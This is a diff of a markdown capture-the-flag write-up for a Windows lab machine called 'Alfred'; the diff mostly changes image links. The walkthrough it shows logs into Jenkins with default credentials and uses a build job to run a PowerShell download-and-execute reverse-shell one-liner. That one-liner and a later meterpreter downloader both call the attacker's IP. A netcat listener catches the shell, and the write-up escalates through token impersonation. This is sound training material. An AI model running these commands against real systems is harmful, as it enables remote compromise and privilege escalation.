@@ -7,7 +7,7 @@ first of all like all other machines, we must begin with an nmap scan. this allo
 nmap -sC -sV -T4 -oN scan -p- -P0 10.10.24.159
 ```
 
-![[1.png]]
+![image](/posts/res/alfred_1.png)
 
 from the result of our scan, we can see that we have the following ports open on our target.
 
@@ -18,22 +18,24 @@ from the result of our scan, we can see that we have the following ports open on
 since we have couple web server on our target let's try to enumerate them for possible ways to gain initial access.
 
 so we can simply head over to our web browser to view the webpage hosted by our web server.
-![[2.png]]
+
+![image](/posts/res/alfred_2.png)
 
 from the first web server running on port 80 we can see a page. attempting to view the source code gives us nothing useful so lets move to the next port(8080).
 
 navigating to http://10.10.24.159:8080 reveals the login panel for the jenkins application.
-![[3.png]]
+
+![image](/posts/res/alfred_3.png)
 
 now Jenkins is **a Java-based open-source automation platform with plugins designed for continuous integration**. It is used to continually create and test software projects, making it easier for developers and DevOps engineers to integrate changes to the project and for consumers to get a new build.
 
 with the login form we can attempt to check for misconfigurations by simply inputting the default user credentialss for the jenkins application.
 
-![[4.png]]
+![image](/posts/res/alfred_4.png)
 
 from a quick google search we can tell that the default credentials for the jenkins application is ***admin:admin***.
 
-![[5.png]]
+![image](/posts/res/alfred_5.png)
 
 now using this credentials, we are able to login. but how do we gain initial access?
 
@@ -41,11 +43,11 @@ we are told to find a feature that allows us to execute commands on the underlyi
 
 we can take note of a job called project on the dashboard.
 
-![[6.png]]
+![image](/posts/res/alfred_6.png)
 
 clicking on the project item, allows us o edit and make some changes to it.
 
-![[7.png]]
+![image](/posts/res/alfred_7.png)
 
 now we click on the configure tab, because this allows us to execute system commands on the server.
 
@@ -56,7 +58,7 @@ wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-
 ```
 
 
-![[8.png]]
+![image](/posts/res/alfred_8.png)
 
 with the rev shell script successfully downloaded to our attacker machine now start up a simple http server using python. this allows us to serve the file on a local server.
 
@@ -64,7 +66,7 @@ with the rev shell script successfully downloaded to our attacker machine now st
 python3 -m http.server 4444
 ```
 
-![[9.png]]
+![image](/posts/res/alfred_9.png)
 
 In order to transfer the powershell script into the web server, we would run the following command using the  Configure feature on the server 
 
@@ -72,7 +74,7 @@ In order to transfer the powershell script into the web server, we would run the
 powershell iex (New-Object Net.WebClient).DownloadString('http://10.9.215.120:4444/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.9.215.120 -Port 8000
 ```
 
-![[10.png]]
+![image](/posts/res/alfred_10.png)
 
 now we setup a netcat listener to catch the reverse shell connection.
 
@@ -83,25 +85,25 @@ nc -lnvp 8000
 
 after clicking on apply move back to the previous page and click on the ***build now tab*** .
 
-![[11.png]]
+![image](/posts/res/alfred_11.png)
 
 we can now see that our build has began running.
 
-![[12.png]]
+![image](/posts/res/alfred_12.png)
 
 
 heading back to our terminal we have successfully gotten the file over to the server and executed it to give us a reverse shell.
 
-![[13.png]]
+![image](/posts/res/alfred_13.png)
 
 
-![[14.png]]
+![image](/posts/res/alfred_14.png)
 
 to find the user flag lets navigate through the directories.
 
 we navigate over to the Desktop directory of the user bruce and we have successfully found the user flag!!
 
-![[15.png]]
+![image](/posts/res/alfred_15.png)
 
 you can view the file by using the following command 
 
@@ -123,7 +125,7 @@ This payload generates an encoded x86-64 reverse TCP meterpreter payload. Payloa
 
 with our payload ready, let's transfer it over to the target system using the same process as earlier on.
 
-![[16.png]]
+![image](/posts/res/alfred_16.png)
 
 we head over back to the project job and click on the configure tab. now we paste the following code in the command text area.
 
@@ -134,14 +136,14 @@ powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.215.120:
 
 
 
-![[17.png]]
+![image](/posts/res/alfred_17.png)
 
 now we click on apply and then head back to the previous page and click on build now. this would enable our script to get downloaded over to the server.
 
 
-![[18.png]]
+![image](/posts/res/alfred_18.png)
 
-![[19.png]]
+![image](/posts/res/alfred_19.png)
 
 now before running the program we must set up a handler using metasploit.
 
@@ -154,7 +156,7 @@ set LPORT listening-port
 
 ```
 
-![[20.png]]
+![image](/posts/res/alfred_20.png)
 
 with our rev shell on the target system lets move it over to the Temp directory.
 
@@ -166,7 +168,7 @@ cd C:/Windows/Temp
 Move-Item -Path "C:\Program Files (x86)\Jenkins\workspace\project\wannacry.exe" -Destination "C:\Windows\Temp"
 ```
 
-![[21.png]]
+![image](/posts/res/alfred_21.png)
 
 
 now we can run the program by running the following command
@@ -177,7 +179,7 @@ Start-Process "wannacry.exe"
 
 we've successfully gotten a meterpreter shell
 
-![[22.png]]
+![image](/posts/res/alfred_22.png)
 
 
 now we can view all privileges of the user using the following command
@@ -187,7 +189,7 @@ whoami /priv
 ```
 
 
-![[23.png]]
+![image](/posts/res/alfred_23.png)
 
 we are presented with a list of privileges but only a couple of them are enabled
 
@@ -203,7 +205,7 @@ we can now exit our shell back to the meterpreter shell and run the following co
 load incognito 
 ```
 
-![[24.png]]
+![image](/posts/res/alfred_24.png)
 
 now we list tokens using the following command
 
@@ -218,7 +220,7 @@ impersonate_token "BUILTIN\Administrators"
 
 ```
 
-![[26.png]]
+![image](/posts/res/alfred_25.png)
 
 Even though you have a higher privileged token, you may not have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do).
 
@@ -229,7 +231,7 @@ Ensure that you migrate to a process with correct permissions (the above questio
 ```
 
 
-![[27.png]]
+![image](/posts/res/alfred_27.png)
 
 now we can read the content of the root.txt file located at  **C:\Windows\System32\config** 
 
